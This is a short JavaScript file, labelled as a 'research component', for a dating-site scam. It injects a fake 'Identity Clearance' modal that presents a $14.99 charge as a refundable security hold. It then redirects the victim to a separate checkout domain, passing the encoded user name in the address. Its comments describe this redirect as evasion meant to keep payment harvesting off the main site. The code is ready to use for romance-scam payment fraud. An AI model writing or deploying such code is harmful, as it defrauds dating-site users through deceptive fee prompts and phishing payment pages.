/**
 * RESEARCH COMPONENT: Advanced Conversion & Fee Logic
 * Name: verify.js
 */

function triggerVerification() {
    // 1. Create the "Security Backdrop"
    const modal = document.createElement('div');
    modal.className = 'premium-modal-overlay';
    
    // 2. The Content: Framing the fee as "Safety"
    // Scammers use "USA-standard" terminology to sound legitimate
    modal.innerHTML = `
        <div class="modal-content glass-effect">
            <div class="shield-icon">🛡️</div>
            <h2>Identity Clearance Required</h2>
            <p>To protect our female community and prevent automated bots, 
               <strong>PureMatch</strong> requires a one-time ID Verification.</p>
            
            <div class="fee-breakdown">
                <span>Security Deposit (Refundable):</span>
                <span class="price">$14.99</span>
            </div>

            <p class="small-text">
                *This is NOT a charge. This is an authorization hold. 
                The funds will be released back to your account within 24 hours.
            </p>

            <button class="pay-btn" onclick="redirectToGateway()">
                Proceed to Secure Payment
            </button>
            
            <div class="payment-logos">
                <img src="visa_logo.png"> <img src="mastercard_logo.png">
            </div>
        </div>
    `;

    document.body.appendChild(modal);
}

function redirectToGateway() {
    // 3. Final Evasion: 
    // The script redirects to a separate 'checkout' domain so the 
    // main site remains "clean" of payment harvesting code.
    const checkoutURL = "https://checkout-id-verify.net/process?user=" + btoa(sessionStorage.getItem('userName'));
    window.location.href = checkoutURL;
}

